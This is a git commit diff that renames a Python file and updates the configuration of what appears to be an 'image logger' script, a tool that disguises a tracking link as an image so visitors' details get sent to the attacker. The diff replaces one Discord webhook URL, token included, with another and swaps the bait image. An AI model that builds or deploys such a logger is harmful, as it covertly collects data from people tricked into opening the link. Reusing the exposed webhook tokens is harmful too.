ac20353bfed0a06f8394561b08328caf698ff7e0
Kr2pt <Khobaibwastaken0@gmail.com>
2025-12-25 12:42:38 -0800

    Update and rename Sad crying.py to Sadcrying.py

--- api/Sadcrying.py
+++ api/Sadcrying.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1453127124977320068/hAX_I3oNNn8nJd49ovzHZTf36WH443vCQezqQJu0y9sUBNFPbXjCz5Jrkg3JfLyMf8A0",
+    "image": "https://c.tenor.com/jDXNIPAp7h4AAAAC/tenor.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
